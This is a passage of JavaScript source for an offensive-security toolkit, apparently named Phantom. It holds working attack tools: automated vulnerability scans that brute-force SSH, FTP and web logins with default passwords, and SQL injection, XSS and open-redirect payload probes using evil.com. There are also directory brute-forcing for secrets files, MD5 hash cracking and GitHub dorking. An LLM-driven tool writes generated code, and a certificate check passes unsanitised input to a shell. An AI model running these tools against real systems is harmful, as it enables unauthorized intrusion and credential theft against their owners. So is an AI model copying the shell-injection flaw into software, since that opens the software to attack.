    try { const r = await hackerTools.whois(domain); lines.push(`### WHOIS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.dns_lookup(domain); lines.push(`### DNS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.sub_enum(domain); lines.push(`### Subdomains\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.http_headers(`https://${domain}`); lines.push(`### HTTP Headers\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.ssl_check(domain); lines.push(`### SSL/TLS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    const ports = await hackerTools.port_scan(domain);
    lines.push(`### Open Ports\n\`\`\`\n${ports}\n\`\`\``);
    // Phase 2
    lines.push(`\n## Phase 2: Vulnerability Search\n`);
    try { lines.push(`### CVEs\n\`\`\`\n${await hackerTools.cve_search(domain)}\n\`\`\``); } catch {}
    // Phase 3
    lines.push(`\n## Phase 3: Exploit Search\n`);
    try { lines.push(`### Exploits\n\`\`\`\n${await hackerTools.searchsploit(domain)}\n\`\`\``); } catch {}
    // Phase 4
    lines.push(`\n## Phase 4: Brute Force Testing\n`);
    const openPorts = [...ports.matchAll(/(\d+)\/tcp\s+open/gi)].map(m => parseInt(m[1]));
    if (openPorts.includes(22)) { lines.push(`- Port 22 (SSH) open`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`ssh|${domain}|root|admin,root,toor,123456,password`)}\n\`\`\``); } catch {} }
    if (openPorts.includes(21)) { lines.push(`- Port 21 (FTP) open`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`ftp|${domain}|admin|admin,password,ftp`)}\n\`\`\``); } catch {} }
    if (openPorts.some(p => [80, 443, 8080, 8443].includes(p))) { lines.push(`- Web server detected`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`http|https://${domain}/login|admin|admin,password,admin123`)}\n\`\`\``); } catch {} }
    // Save
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const reportPath = resolve(REPORTS_DIR, `vulnscan_${domain}_${ts}.md`);
    fs.writeFileSync(reportPath, lines.join("\n"), "utf-8");
    lines.push(`\n---\n📄 Full report: ${reportPath}`);
    return lines.join("\n");
  },

  report_save: async (input) => {
    const parts = input.split("|");
    const name = (parts[0] || `report_${Date.now()}`).replace(/[^a-z0-9_-]/gi, "_");
    const content = parts.slice(1).join("|") || input;
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const fp = resolve(REPORTS_DIR, `${name}.md`);
    fs.writeFileSync(fp, content, "utf-8");
    return `📄 Report saved: ${fp}`;
  },

  session_save: async (name) => {
    const sessionsDir = resolve(BASE_DIR, "sessions");
    try {
      if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir, { recursive: true });
      const slug = name.replace(/[^a-z0-9_-]/gi, "_");
      const data = { name, created: new Date().toISOString(), tools: Object.keys(hackerTools).length };
      fs.writeFileSync(resolve(sessionsDir, `${slug}.json`), JSON.stringify(data, null, 2), "utf-8");
      return `✅ Session saved: ${slug}`;
    } catch (e) { return `[Session Error] ${e.message}`; }
  },

  session_load: async (name) => {
    const sessionsDir = resolve(BASE_DIR, "sessions");
    try {
      const slug = name.replace(/[^a-z0-9_-]/gi, "_");
      const fp = resolve(sessionsDir, `${slug}.json`);
      if (!fs.existsSync(fp)) return `[Session] Not found: ${name}`;
      const data = JSON.parse(fs.readFileSync(fp, "utf-8"));
      return `📂 Session: ${data.name}\nCreated: ${data.created}\nTools: ${data.tools}`;
    } catch (e) { return `[Session Error] ${e.message}`; }
  },

  code_gen: async (input) => {
    const parts = input.split("|");
    const [prompt, lang = "javascript", outPath = ""] = parts;
    const llm = __r.llmInstance;
    if (!llm || !llm.chat) {
      const stub = `// ${prompt}\n// Language: ${lang}\nfunction ${(prompt||"").replace(/[^a-z]/gi, "")}() {\n  // TODO\n}\n`;
      if (outPath) { fs.writeFileSync(resolve(outPath), stub, "utf-8"); return `✅ Stub written to ${outPath}`; }
      return stub;
    }
    try {
      const code = await llm.chat([
        { role: "system", content: `Generate only ${lang} code. No explanations.` },
        { role: "user", content: prompt }
      ], { model: llm.defaultModel || "deepseek-v4-flash-free" });
      if (code.startsWith("[") && code.includes("]")) return `[Code Gen] LLM error: ${code.substring(0, 200)}`;
      if (outPath) { fs.writeFileSync(resolve(outPath), code, "utf-8"); return `✅ Generated ${code.length} chars → ${outPath}`; }
      return code;
    } catch (e) { return `[Code Gen Error] ${e.message}`; }
  },

  self_add_tool: async (prompt) => {
    const llm = __r.llmInstance;
    if (!llm || !llm.chat) return "[Self Add] No LLM provider configured. Use @llm_config to set one up.";
    try {
      const result = await llm.chat([
        { role: "system", content: `Generate a Node.js async function taking a string input and returning Promise<string>. Name it after the tool purpose. No markdown. Only code, no explanations.` },
        { role: "user", content: `Tool that: ${prompt}` }
      ], { model: llm.defaultModel || "deepseek-v4-flash-free" });
      if (result.startsWith("[") && result.includes("]")) return `[Self Add] LLM error: ${result.substring(0, 200)}`;
      const toolName = result.match(/async function\s+(\w+)/)?.[1] || "newTool";
      const genDir = resolve(BASE_DIR, "generated");
      if (!fs.existsSync(genDir)) fs.mkdirSync(genDir, { recursive: true });
      fs.writeFileSync(resolve(genDir, `${toolName}.ts`), result, "utf-8");
      return `🎯 Generated tool "${toolName}" at ${genDir}/${toolName}.ts\nIntegrate: paste function into lib/tools.mjs, add to phantom.mjs registry\n\n${result.substring(0, 600)}`;
    } catch (e) { return `[Self Add Error] ${e.message}`; }
  },

  // ── KNOWLEDGE BASE ──
  knowledge_add: async (input) => {
    try {
      const parts = input.split("|");
      const tags = (parts[0] || "general").split(",").map(t => t.trim()).filter(Boolean);
      const content = parts.slice(1).join("|").trim();
      if (!content) return "[Knowledge] Usage: tags|content";
      if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
      const slug = tags[0].replace(/[^a-z0-9_-]/gi, "_") + "_" + Date.now();
      fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({ tags, content, created: new Date().toISOString() }, null, 2), "utf-8");
      return `📚 Knowledge saved (tags: ${tags.join(", ")})`;
    } catch (e) { return `[Knowledge Error] ${e.message}`; }
  },
  knowledge_search: async (input) => {
    try {
      if (!fs.existsSync(KNOWLEDGE_DIR)) return "[Knowledge] Empty";
      const q = input.toLowerCase().trim();
      const results = fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json")).map(f => {
        const d = JSON.parse(fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8"));
        return !q || d.tags.some(t => t.toLowerCase().includes(q)) || d.content.toLowerCase().includes(q) ? `[${d.tags.join(", ")}] ${d.content.substring(0, 200)}` : null;
      }).filter(Boolean);
      return results.length ? `📚 Knowledge (${results.length}):\n${results.join("\n")}` : `[Knowledge] No results for "${q}"`;
    } catch (e) { return `[Knowledge Error] ${e.message}`; }
  },

  // ── BRAIN — search across ALL learned knowledge (books + knowledge) ──
  brain: async (input) => {
    try {
      const q = input.toLowerCase().trim();
      const lines = [];

      // Search books/
      const { BOOKS_DIR: BD } = await import("./config.mjs");
      if (fs.existsSync(BD)) {
        for (const f of fs.readdirSync(BD).filter(f => f.endsWith(".txt"))) {
          const content = fs.readFileSync(resolve(BD, f), "utf-8");
          if (!q || content.toLowerCase().includes(q)) {
            const tag = f.replace(".txt", "").replace(/_/g, " ");
            const matchLines = content.split("\n").filter(l => !q || l.toLowerCase().includes(q)).slice(0, 5);
            lines.push(`📖 ${tag}:`);
            for (const l of matchLines) lines.push(`  ${l.substring(0, 150)}`);
          }
        }
      }

      // Search knowledge/
      if (fs.existsSync(KNOWLEDGE_DIR)) {
        for (const f of fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".txt") || f.endsWith(".json"))) {
          const content = fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8");
          if (!q || content.toLowerCase().includes(q)) {
            const tag = f.replace(/\.[^.]+$/, "").replace(/_/g, " ");
            const matchLines = content.split("\n").filter(l => !q || l.toLowerCase().includes(q)).slice(0, 3);
            lines.push(`🔍 ${tag}:`);
            for (const l of matchLines) lines.push(`  ${l.substring(0, 150)}`);
          }
        }
      }

      if (lines.length === 0) return q ? `[brain] Nothing found for "${q}"` : "[brain] Nothing learned yet. Use tools, read books, or run @study.";
      return lines.join("\n");
    } catch (e) { return `[brain Error] ${e.message}`; }
  },

  // ── HACKBOOK — zero-day taxonomy / security reference ──
  hackbook: async (input) => {
    try {
      const { HACKBOOK_DIR } = await import("./config.mjs");
      if (!input || !input.trim()) {
        // List available topics
        if (!fs.existsSync(HACKBOOK_DIR)) {
          fs.mkdirSync(HACKBOOK_DIR, { recursive: true });
          return "[hackbook] Empty. Use @hackbook|topic to search taxonomy.";
        }
        const files = fs.readdirSync(HACKBOOK_DIR).filter(f => f.endsWith(".txt"));
        if (files.length === 0) return "[hackbook] No taxonomy files. Seed with @learn_book.";
        return `📚 Hackbook (${files.length} files):\n${files.map(f => `  ${f.replace(".txt", "")}`).join("\n")}`;
      }

      const q = input.toLowerCase().trim();
      const results = [];
      for (const f of fs.readdirSync(HACKBOOK_DIR).filter(f => f.endsWith(".txt"))) {
        const content = fs.readFileSync(resolve(HACKBOOK_DIR, f), "utf-8");
        const lines = content.split("\n");
        const matches = lines.filter(l => l.toLowerCase().includes(q));
        if (matches.length > 0) {
          const tag = f.replace(".txt", "");
          results.push(`📖 ${tag}:`);
          for (const m of matches.slice(0, 8)) results.push(`  ${m.replace(/^###?\s*/, "").substring(0, 150)}`);
        }
      }
      return results.length > 0
        ? results.join("\n")
        : `[hackbook] Nothing for "${q}". Topics: ${fs.readdirSync(HACKBOOK_DIR).filter(f => f.endsWith(".txt")).map(f => f.replace(".txt", "")).join(", ")}`;
    } catch (e) { return `[hackbook Error] ${e.message}`; }
  },

  // ── PLAYBOOK SYSTEM ──
  playbook_list: async () => {
    try {
      if (!fs.existsSync(PLAYBOOKS_DIR)) fs.mkdirSync(PLAYBOOKS_DIR, { recursive: true });
      // Seed built-ins
      const BUILTINS = [
        { name:"quick_web_recon", description:"Full recon on a web target", variables:["target"], steps:[
          {tool:"whois",args:"{{target}}",desc:"WHOIS"},{tool:"dns_lookup",args:"{{target}}",desc:"DNS"},{tool:"sub_enum",args:"{{target}}",desc:"Subdomains"},{tool:"port_scan",args:"{{target}}",desc:"Ports"},{tool:"http_headers",args:"https://{{target}}",desc:"Headers"},{tool:"ssl_check",args:"{{target}}",desc:"SSL"}
        ]},
        { name:"vuln_assessment", description:"Full vuln assessment: recon + CVE + exploits", variables:["target"], steps:[
          {tool:"recon",args:"{{target}}",desc:"Recon sweep"},{tool:"cve_search",args:"{{target}}",desc:"CVEs"},{tool:"searchsploit",args:"{{target}}",desc:"Exploits"},{tool:"bruteforce",args:"ssh|{{target}}|root|admin,root,password",desc:"SSH brute"}
        ]},
        { name:"network_footprint", description:"Map network footprint: DNS, whois, geo, ports, crawl", variables:["target"], steps:[
          {tool:"dns_lookup",args:"{{target}}",desc:"DNS"},{tool:"whois",args:"{{target}}",desc:"WHOIS"},{tool:"port_scan",args:"{{target}}",desc:"Ports"},{tool:"crawl",args:"https://{{target}}",desc:"Crawl"}
        ]},
        { name:"full_vulnscan_report", description:"Auto vuln_scan + save report + session", variables:["target"], steps:[
          {tool:"vuln_scan",args:"{{target}}",desc:"Full scan"},{tool:"session_save",args:"scan_{{target}}",desc:"Save session"}
        ]},
      ];
      for (const pb of BUILTINS) {
        const fp = resolve(PLAYBOOKS_DIR, `${pb.name}.json`);
        if (!fs.existsSync(fp)) fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8");
      }
      const files = fs.readdirSync(PLAYBOOKS_DIR).filter(f => f.endsWith(".json"));
      if (!files.length) return "[Playbook] No playbooks found";
      const lines = files.map(f => {
        const pb = JSON.parse(fs.readFileSync(resolve(PLAYBOOKS_DIR, f), "utf-8"));
        return `📋 ${pb.name} — ${(pb.description||"").substring(0, 80)} (${(pb.steps||[]).length} steps)`;
      });
      return `Available playbooks (${files.length}):\n${lines.join("\n")}`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_create: async (input) => {
    try {
      const parts = input.split("|");
      const name = (parts[0] || `pb_${Date.now()}`).replace(/[^a-z0-9_-]/gi, "_");
      const desc = parts[1] || "Auto-generated";
      const stepsRaw = parts.slice(2).join("|") || "";
      const apiKey = process.env.OPENAI_API_KEY;
      if (apiKey && !stepsRaw) {
        try {
          const r = await fetch("https://api.openai.com/v1/chat/completions", {
            method:"POST", headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`},
            body:JSON.stringify({model:"gpt-4o-mini",messages:[{role:"system",content:"Generate a JSON playbook. Format: {name,description,variables:[\"target\"],steps:[{tool,args,desc}]}. Only valid JSON."},{role:"user",content:`Create playbook: ${desc}`}],max_tokens:1000}),
            signal:AbortSignal.timeout(30000),
          });
          const d = await r.json();
          const pb = JSON.parse(d?.choices?.[0]?.message?.content || "{}");
          if (pb.steps) { pb.name = name; pb.description = desc; fs.writeFileSync(resolve(PLAYBOOKS_DIR, `${name}.json`), JSON.stringify(pb, null, 2), "utf-8"); return `✅ LLM-created playbook: ${name} (${pb.steps.length} steps)`; }
        } catch {}
      }
      const steps = stepsRaw ? stepsRaw.split(",").map(s => ({tool:"shell",args:s.trim(),desc:s.trim()})) : [{tool:"shell",args:"echo hello",desc:"Default step"}];
      fs.writeFileSync(resolve(PLAYBOOKS_DIR, `${name}.json`), JSON.stringify({name,description:desc,variables:["target"],steps}, null, 2), "utf-8");
      return `📋 Playbook created: ${name} (${steps.length} steps)`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_run: async (input) => {
    try {
      const parts = input.split("|");
      const name = parts[0]?.trim();
      if (!name) return "[Playbook] Usage: playbook_run|name|target=example.com";
      const fp = resolve(PLAYBOOKS_DIR, `${name.replace(/[^a-z0-9_-]/gi, "_")}.json`);
      if (!fs.existsSync(fp)) return `[Playbook] Not found: ${name}`;
      const pb = JSON.parse(fs.readFileSync(fp, "utf-8"));
      const vars = {};
      if (parts[1]) parts[1].split(",").forEach(p => { const [k,v] = p.split("="); if (k && v) vars[k.trim()] = v.trim(); });
      const log = [`Executing: ${pb.name}`, `Description: ${pb.description}`, `---`, ``];
      for (let i = 0; i < pb.steps.length; i++) {
        const s = pb.steps[i];
        let args = s.args;
        for (const [k, v] of Object.entries(vars)) args = args.replace(new RegExp(`\\{\\{${k}\\}\\}`, "g"), v);
        log.push(`Step ${i+1}/${pb.steps.length}: @${s.tool}|${args} — ${s.desc}`);
        try {
          if (!hackerTools[s.tool]) { log.push(`  ⚠ Unknown tool: ${s.tool}`); continue; }
          const r = await hackerTools[s.tool](args);
          log.push(`  ${r.substring(0, 1000)}`);
          if (r.length > 1000) log.push(`  … (${r.length} total)`);
        } catch (e) { log.push(`  ⚠ Error: ${e.message}`); }
        log.push(``);
      }
      log.push(`---\n✅ "${pb.name}" complete (${pb.steps.length} steps)`);
      return log.join("\n");
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_edit: async (input) => {
    try {
      const parts = input.split("|");
      const name = parts[0]?.trim();
      if (!name) return "[Playbook] Usage: playbook_edit|name|step|tool|args|desc";
      const fp = resolve(PLAYBOOKS_DIR, `${name.replace(/[^a-z0-9_-]/gi, "_")}.json`);
      if (!fs.existsSync(fp)) return `[Playbook] Not found: ${name}`;
      const pb = JSON.parse(fs.readFileSync(fp, "utf-8"));
      if (parts[1] === "desc" && parts[2]) { pb.description = parts[2]; fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8"); return `✅ Description updated`; }
      if (parts[1] === "add" && parts[2]) { pb.steps.push({tool:parts[2],args:parts[3]||"",desc:parts[4]||parts[2]}); fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8"); return `✅ Step added`; }
      const idx = parseInt(parts[1]) - 1;
      if (isNaN(idx) || idx < 0 || idx >= pb.steps.length) return `[Playbook] Invalid step. Steps: 1-${pb.steps.length}`;
      if (parts[2]) pb.steps[idx].tool = parts[2];
      if (parts[3]) pb.steps[idx].args = parts[3];
      if (parts[4]) pb.steps[idx].desc = parts[4];
      fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8");
      return `✅ Step ${idx+1} updated: @${pb.steps[idx].tool}|${pb.steps[idx].args}`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },

  // ── RECON TOOLS ──
  geoip: async (ip) => {
    try {
      const r = await fetch(`http://ip-api.com/json/${ip.trim()}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      if (d.status === "fail") return `[GeoIP] ${d.message || "Unknown"}`;
      return `🌍 GeoIP: ${d.query}\nCountry: ${d.country}\nRegion: ${d.regionName}\nCity: ${d.city}\nZIP: ${d.zip}\nCoordinates: ${d.lat}, ${d.lon}\nISP: ${d.isp}\nOrg: ${d.org}\nASN: ${d.as}`;
    } catch (e) { return `[GeoIP Error] ${e.message}`; }
  },
  dns_zone: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const nsResp = await fetch(`https://dns.google/resolve?name=${domain}&type=NS`, {signal:AbortSignal.timeout(8000)});
      const nsData = await nsResp.json();
      const nsList = (nsData?.Answer||[]).map(a => a.data.replace(/\.$/, ""));
      if (!nsList.length) return "[DNS Zone] No NS records found";
      const results = [`Testing ${nsList.length} NS for zone transfer on ${domain}:`,``];
      for (const ns of nsList) {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${domain}&type=AXFR&nameserver=${ns}`, {signal:AbortSignal.timeout(10000)});
          const d = await r.json();
          if (d?.Answer?.length > 0) { results.push(`⚠ VULNERABLE: ${ns} returned ${d.Answer.length} records!`); d.Answer.forEach(a => results.push(`  ${a.name} ${a.type} ${a.data}`)); }
          else results.push(`✅ ${ns} — zone transfer denied`);
        } catch { results.push(`⏰ ${ns} — timeout/error`); }
      }
      return results.join("\n");
    } catch (e) { return `[DNS Zone Error] ${e.message}`; }
  },
  http_methods: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const methods = ["GET","POST","PUT","DELETE","OPTIONS","PATCH","HEAD","TRACE","CONNECT"];
      const results = [`Testing HTTP methods on ${url}:`,``];
      for (const method of methods) {
        try {
          const r = await fetch(url, {method, signal:AbortSignal.timeout(5000)});
          const allow = r.headers.get("allow") || r.headers.get("access-control-allow-methods") || "";
          results.push(`  ${method} → ${r.status}${allow ? ` (Allow: ${allow})` : ""}`);
        } catch (e) { results.push(`  ${method} → Error: ${(e.message||"").substring(0,60)}`); }
      }
      return results.join("\n");
    } catch (e) { return `[HTTP Methods Error] ${e.message}`; }
  },
  robots_txt: async (input) => {
    try {
      const base = input.startsWith("http") ? input : `https://${input}`;
      const url = `${base.replace(/\/+$/, "")}/robots.txt`;
      const r = await fetch(url, {signal:AbortSignal.timeout(8000)});
      if (r.status === 404) return `[robots.txt] Not found at ${url}`;
      const text = await r.text();
      const disallowed = text.match(/Disallow:\s*(.+)/gi) || [];
      const sitemaps = text.match(/Sitemap:\s*(.+)/gi) || [];
      return `🤖 robots.txt from ${url}:\n---\n${text.substring(0,2000)}${disallowed.length ? `\n\n🚫 Disallowed (${disallowed.length}):\n${disallowed.join("\n")}` : ""}${sitemaps.length ? `\n\n🗺 Sitemaps (${sitemaps.length}):\n${sitemaps.join("\n")}` : ""}`;
    } catch (e) { return `[robots.txt Error] ${e.message}`; }
  },
  email_verify: async (input) => {
    try {
      const email = input.trim().toLowerCase();
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return `[Email] Invalid: ${email}`;
      const domain = email.split("@")[1];
      const r = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const mxs = (d?.Answer||[]).filter(a => a.type === 15).map(a => a.data.replace(/\.$/, ""));
      return mxs.length ? `✅ ${email}\nDomain: ${domain}\nMX: ${mxs.join(", ")}` : `✅ Format valid, but no MX for ${domain}`;
    } catch (e) { return `[Email Error] ${e.message}`; }
  },

  reverse_dns: async (ip) => {
    try {
      const r = await fetch(`https://dns.google/resolve?name=${ip.trim()}&type=PTR`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const ptrs = (d?.Answer||[]).filter(a => a.type === 12).map(a => a.data);
      return ptrs.length ? `🔁 PTR for ${ip}:\n${ptrs.join("\n")}` : `[Reverse DNS] No PTR for ${ip}`;
    } catch (e) { return `[Reverse DNS Error] ${e.message}`; }
  },
  wayback: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const r = await fetch(`https://web.archive.org/cdx/search/cdx?url=${domain}/*&output=json&limit=20&fl=timestamp,original,statuscode`, {signal:AbortSignal.timeout(15000)});
      const d = await r.json();
      if (!Array.isArray(d) || d.length < 2) return `[Wayback] No snapshots for ${domain}`;
      return `🗄 Wayback: ${domain} (${d.length - 1} snapshots)\n${d.slice(1).map(row => `  ${row[0].substring(0,8)} ${row[2]||"—"} ${row[1]}`).join("\n")}`;
    } catch (e) { return `[Wayback Error] ${e.message}`; }
  },
  cert_expiry: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const {execSync} = await import("child_process");
      const raw = execSync(`openssl s_client -connect ${domain}:443 -servername ${domain} </dev/null 2>/dev/null | openssl x509 -noout -dates`, {timeout:10000,encoding:"utf-8"});
      if (!raw.trim()) return `[Cert Expiry] No cert for ${domain}`;
      const nb = raw.match(/notBefore=(.+)/)?.[1] || "?";
      const na = raw.match(/notAfter=(.+)/)?.[1] || "?";
      const days = na !== "?" ? Math.round((new Date(na).getTime()-Date.now())/86400000) : NaN;
      return `🔒 ${domain}\nIssued: ${nb}\nExpires: ${na}${!isNaN(days)?`\nDays left: ${days}`:""}`;
    } catch (e) { return `[Cert Expiry Error] ${e.message}`; }
  },
  cors_test: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const origins = ["https://evil.com","null","https://attacker.org","https://example.com",""];
      const r = [`🔓 CORS test: ${url}\n`];
      for (const origin of origins) {
        try {
          const resp = await fetch(url, {method:"GET", headers:origin?{Origin:origin}:{}, signal:AbortSignal.timeout(5000)});
          const acao = resp.headers.get("access-control-allow-origin") || "—";
          const creds = resp.headers.get("access-control-allow-credentials") || "";
          r.push(`  Origin: ${origin||"(none)"} → ACAO: ${acao}${creds?`, Credentials: ${creds}`:""}`);
        } catch (e) { r.push(`  Origin: ${origin} → ${(e.message||"").substring(0,50)}`); }
      }
      if (r.some(l => l.includes("*") || (l.includes("evil.com")&&l.includes("https://evil.com")))) r.push(`\n⚠ Vulnerable to CORS attacks!`);
      return r.join("\n");
    } catch (e) { return `[CORS Error] ${e.message}`; }
  },
  jwt_decode: async (input) => {
    try {
      const parts = input.trim().split(".");
      if (parts.length !== 3) return `[JWT] Expected 3 parts, got ${parts.length}`;
      const b64u = s => s.replace(/-/g,"+").replace(/_/g,"/");
      const decode = s => { try { return JSON.stringify(JSON.parse(Buffer.from(b64u(s),"base64").toString()),null,2); } catch { return Buffer.from(b64u(s),"base64").toString(); } };
      return `🔐 JWT\n── Header ──\n${decode(parts[0])}\n── Payload ──\n${decode(parts[1])}\n── Signature ──\n${parts[2].substring(0,40)}…`;
    } catch (e) { return `[JWT Error] ${e.message}`; }
  },
  hash_crack: async (input) => {
    try {
      const hash = input.trim();
      if (/^[a-f0-9]{32}$/i.test(hash)) {
        const r = await fetch(`https://www.nitrxgen.net/api/md5/${hash}`, {signal:AbortSignal.timeout(10000)});
        const text = await r.text();
        if (text?.trim()) return `🔓 MD5 cracked: ${hash} → ${text.trim()}`;
      }
      return `[Hash Crack] Not found: ${hash}. Supports MD5.`;
    } catch (e) { return `[Hash Crack Error] ${e.message}`; }
  },

  dir_bruteforce: async (input) => {
    try {
      const url = input.startsWith("http") ? input.replace(/\/+$/, "") : `https://${input.replace(/\/+$/, "")}`;
      const paths = ["/admin","/api","/.git","/.env","/backup","/wp-admin","/login","/config","/robots.txt","/.htaccess","/phpinfo.php","/test","/uploads","/debug","/graphql","/swagger","/api/v1","/health","/actuator","/console","/jenkins","/phpmyadmin","/cgi-bin","/server-status","/shell","/crossdomain.xml","/.well-known/security.txt","/metrics","/dump","/logs"];
      const results = (await Promise.allSettled(paths.map(async p => {
        try { const r = await fetch(url + p, {signal:AbortSignal.timeout(5000)}); if (r.status !== 404) return `  ${r.status} ${url}${p}`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🔍 Dir Bruteforce — ${results.length} hits on ${url}\n${results.join("\n")}` : `[DirBrute] No paths at ${url}`;
    } catch (e) { return `[DirBrute Error] ${e.message}`; }
  },
  xss_scan: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "{{constructor.constructor('alert(1)')()}}", "'';!--\"<XSS>=&{()}"];
      const results = (await Promise.allSettled(payloads.map(async p => {
        try { const tu = (url.includes("?") ? url + "&" : url + "?") + "q=" + encodeURIComponent(p); const r = await fetch(tu, {signal:AbortSignal.timeout(5000)}); const t = await r.text(); if (t.includes(p.substring(0,15))) return `  ⚠ ${p.substring(0,25)} reflected`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🚨 XSS — ${results.length} reflection(s) on ${url}\n${results.join("\n")}` : `[XSS] No reflection at ${url}`;
    } catch (e) { return `[XSS Error] ${e.message}`; }
  },
  sql_detect: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1--", "' AND 1=1--", "' AND SLEEP(3)--", "'; DROP TABLE users--", "' OR '1'='1' /*"];
      const results = (await Promise.allSettled(payloads.map(async p => {
        try { const tu = url.includes("?") ? url.replace(/([=?&])[^=&]+$/, "$1" + encodeURIComponent(p)) : url + "?id=" + encodeURIComponent(p); const r = await fetch(tu, {signal:AbortSignal.timeout(8000)}); const t = (await r.text().catch(() => "")).toLowerCase(); if (["sql","mysql","sqlite","syntax","unclosed","quotation","jdbc"].some(s => t.includes(s))) return `  ⚠ ${p.substring(0,20)} → SQL error`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `⚠️ SQLi — ${results.length} injection(s) on ${url}\n${results.join("\n")}` : `[SQLi] No errors at ${url}`;
    } catch (e) { return `[SQLi Error] ${e.message}`; }
  },
  open_redirect: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const params = ["url","redirect","redirect_uri","return","return_to","r","next","target","redir","dest","out","to","go","callback","ref"];
      const results = (await Promise.allSettled(params.map(async p => {
        try { const tu = (url.includes("?") ? url + "&" : url + "?") + p + "=https://evil.com"; const r = await fetch(tu, {redirect:"manual",signal:AbortSignal.timeout(5000)}); if ((r.headers.get("location")||"").includes("evil.com")) return `  ⚠ ${p}= → external redirect`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🔀 Redirect — ${results.length} open redirect(s)\n${results.join("\n")}` : `[OpenRedirect] None at ${url}`;
    } catch (e) { return `[OpenRedirect Error] ${e.message}`; }
  },
  shodan_search: async (input) => {
    const key = process.env.SHODAN_API_KEY;
    if (!key) return `[Shodan] Set SHODAN_API_KEY env var`;
    try {
      const r = await fetch(`https://api.shodan.io/shodan/host/search?key=${key}&query=${encodeURIComponent(input.trim())}&limit=10`, {signal:AbortSignal.timeout(15000)});
      const d = await r.json();
      if (!d.matches?.length) return `[Shodan] No results for "${input}"`;
      return `🌐 Shodan — ${d.total} result(s)\n${d.matches.slice(0,10).map(m => `  ${m.ip_str}:${m.port} ${m.transport||""} ${(m.product||m.data||"").substring(0,50)}`).join("\n")}`;
    } catch (e) { return `[Shodan Error] ${e.message}`; }
  },
  email_breach: async (input) => {
    try {
      const email = input.trim().toLowerCase();
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return `[EmailBreach] Invalid email`;
      const key = process.env.HIBP_API_KEY;
      if (!key) return `[EmailBreach] Set HIBP_API_KEY env var`;
      const r = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=true`, {headers:{"hibp-api-key":key,"User-Agent":"Phantom"}, signal:AbortSignal.timeout(10000)});
      if (r.status === 404) return `🔒 ${email} — No known breaches ✅`;
      if (r.status === 200) { const b = await r.json(); return `⚠️ ${email} — ${b.length} breach(es)\n${b.slice(0,10).map(x => `  🔴 ${x.Name} (${x.BreachDate||"?"})`).join("\n")}`; }
      return `[EmailBreach] HTTP ${r.status}`;
    } catch (e) { return `[EmailBreach Error] ${e.message}`; }
  },
  github_dork: async (input) => {
    try {
      const r = await fetch(`https://api.github.com/search/code?q=${encodeURIComponent(input.trim())}&per_page=10`, {headers:{"Accept":"application/vnd.github.v3+json","User-Agent":"Phantom-Cyber"}, signal:AbortSignal.timeout(15000)});
      if (r.status === 403) return `[GitHubDork] Rate limited. Try again.`;
      const d = await r.json();
      if (!d.items?.length) return `[GitHubDork] No results for "${input}"`;
